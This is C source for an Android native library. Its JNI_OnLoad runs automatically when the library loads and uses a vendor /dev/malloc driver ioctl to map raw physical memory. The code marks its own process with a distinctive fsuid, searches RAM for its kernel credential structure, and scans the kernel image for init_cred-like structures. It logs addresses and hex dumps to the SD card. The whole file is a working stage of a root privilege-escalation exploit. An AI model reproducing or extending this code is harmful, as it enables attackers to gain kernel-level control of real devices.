typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long long u64;
#define SYS_open 5
#define SYS_close 6
#define SYS_write 4
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_getuid 199
#define SYS_setfsuid 138
static long sc(long n,long a,long b,long c,long d,long e,long f){
 register long r7 __asm__("r7")=n; register long r0 __asm__("r0")=a;
 register long r1 __asm__("r1")=b; register long r2 __asm__("r2")=c;
 register long r3 __asm__("r3")=d; register long r4 __asm__("r4")=e;
 register long r5 __asm__("r5")=f;
 __asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");
 return r0;
}
static int lf=-1;
static void w(int fd,const char*s){int n=0;while(s[n])n++;if(fd>=0)sc(SYS_write,fd,(long)s,n,0,0,0);}
static void hx(int fd,u64 v){char b[17];int i;for(i=15;i>=0;i--){int d=v&0xf;b[i]=d<10?'0'+d:'a'+d-10;v>>=4;}b[16]=0;w(fd,b);}
static void dc(int fd,long v){char b[32];int i=31;b[31]=0;if(v<0){w(fd,"-");v=-v;}if(!v){w(fd,"0");return;}while(v&&i){b[--i]='0'+v%10;v/=10;}w(fd,b+i);}
struct info { u64 addr; u64 size; u64 interval; u8 miusel; u8 pad[7]; };
static int pfd=-1;
static unsigned long mp(u64 bus,u64 size){
 struct info i;i.addr=bus-0x20000000ULL;i.size=size;i.interval=0;i.miusel=0;for(int k=0;k<7;k++)i.pad[k]=0;
 long r=sc(SYS_ioctl,pfd,0x80204d04,(long)&i,0,0,0);if(r<0)return 0;
 long p=sc(SYS_mmap2,0,size,3,1,pfd,0);if((unsigned long)p>=0xfffff000UL)return 0;return p;
}
static void dump_at(u64 bus,int len){
 u64 page=bus&~0xfffULL;u32 off=bus&0xfff;unsigned long p=mp(page,0x2000);
 w(lf,"DUMP ");hx(lf,bus);w(lf,"\n");if(!p)return;u8*b=(u8*)p;
 for(int r=0;r<len;r+=16){w(lf," ");hx(lf,bus+r);w(lf," ");for(int c=0;c<16;c++){u8 v=b[off+r+c];char h[3];h[0]="0123456789abcdef"[v>>4];h[1]="0123456789abcdef"[v&15];h[2]=0;w(lf,h);w(lf," ");}w(lf,"\n");}
 sc(SYS_munmap,p,0x2000,0,0,0,0);
}
__attribute__((visibility("default"))) int JNI_OnLoad(void*a,void*b){
 lf=sc(SYS_open,(long)"/sdcard/final1.log",0x241,0644,0,0,0);
 pfd=sc(SYS_open,(long)"/dev/malloc",2,0,0,0,0);
 w(lf,"START uid=");dc(lf,sc(SYS_getuid,0,0,0,0,0,0));w(lf," pfd=");dc(lf,pfd);w(lf,"\n");
 long r=sc(SYS_setfsuid,12345,0,0,0,0,0);w(lf,"sfu=");dc(lf,r);w(lf,"\n");
 u64 credbus=0;
 for(u64 bus=0x60000000ULL;bus<0x92000000ULL && !credbus;bus+=0x1000000ULL){
  unsigned long p=mp(bus,0x1000000);if(!p)continue;u8*b=(u8*)p;
  for(u32 o=0;o<0x1000000-0x100;o+=4){u32*q=(u32*)(b+o);if(q[0]==0&&q[1]==0&&q[2]==0&&q[3]==0&&q[4]==0&&q[5]==0&&q[6]==0&&q[7]==12345){credbus=bus+o-4;break;}}
  sc(SYS_munmap,p,0x1000000,0,0,0,0);
 }
 w(lf,"CRED ");hx(lf,credbus);w(lf,"\n");
 if(credbus) dump_at(credbus,0x100);
 /* scan kernel image for init_cred-like structures */
 int cand=0;
 for(u64 bus=0x20200000ULL;bus<0x21800000ULL;bus+=0x400000ULL){
  unsigned long p=mp(bus,0x400000);if(!p)continue;u8*b=(u8*)p;
  for(u32 o=0;o<0x400000-0x100;o+=4){
   u32 usage=*(u32*)(b+o); if(usage<1||usage>0x100)continue;
   int ok=1; for(int k=1;k<=8;k++){ if(*(u32*)(b+o+k*4)!=0){ok=0;break;} } if(!ok)continue;
   u64 q78=*(u64*)(b+o+0x78), q80=*(u64*)(b+o+0x80), q90=*(u64*)(b+o+0x90);
   if((q78>>40)!=0xffffffULL||(q80>>40)!=0xffffffULL||(q90>>40)!=0xffffffULL)continue;
   w(lf,"CAND ");hx(lf,bus+o);w(lf," u=");dc(lf,usage);w(lf," sec=");hx(lf,q78);w(lf," user=");hx(lf,q80);w(lf," grp=");hx(lf,q90);w(lf,"\n");
   cand++;
  }
  sc(SYS_munmap,p,0x400000,0,0,0,0);
 }
 w(lf,"CANDS=");dc(lf,cand);w(lf,"\n");
 sc(SYS_setfsuid,0,0,0,0,0,0);
 w(lf,"END uid=");dc(lf,sc(SYS_getuid,0,0,0,0,0,0));w(lf,"\n");
 sc(SYS_close,lf,0,0,0,0,0);
 return 0x10006;
}
